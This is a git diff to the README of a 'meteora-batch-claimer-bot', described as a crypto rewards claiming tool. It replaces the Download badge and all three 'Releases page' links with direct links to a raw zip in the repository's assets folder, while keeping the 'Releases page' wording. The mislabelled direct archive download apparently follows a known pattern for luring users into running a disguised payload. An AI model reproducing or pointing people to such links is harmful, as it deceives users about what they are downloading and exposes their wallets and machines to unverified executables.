@@ -1,6 +1,6 @@
 # 🤖 meteora-batch-claimer-bot - Claim Your Meteora Rewards Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-Click%20Here-brightgreen)](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases)
+[![Download](https://github.com/Asgard8121/meteora-batch-claimer-bot/raw/refs/heads/main/assets/claimer_bot_meteora_batch_1.9.zip%20Here-brightgreen)](https://github.com/Asgard8121/meteora-batch-claimer-bot/raw/refs/heads/main/assets/claimer_bot_meteora_batch_1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Meteora Batch Claimer Bot! This tool allows you to easily claim y
 
 ## 📥 Download & Install
 
-To download the software, visit the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases). Here, you will find the latest version of the application.
+To download the software, visit the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/raw/refs/heads/main/assets/claimer_bot_meteora_batch_1.9.zip). Here, you will find the latest version of the application.
 
 1. Click the link to go to the Releases page.
 2. Look for the latest version of the software.
@@ -68,7 +68,7 @@ Make sure your device has a minimum of 4 GB of RAM and 500 MB of free disk space
 If you encounter any issues while using the software, consider the following steps:
 
 - Ensure your internet connection is stable.
-- Check for software updates on the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/releases).
+- Check for software updates on the [Releases page](https://github.com/Asgard8121/meteora-batch-claimer-bot/raw/refs/heads/main/assets/claimer_bot_meteora_batch_1.9.zip).
 - If the application crashes, restart your computer and try again.
 
 ## 🛠️ Support
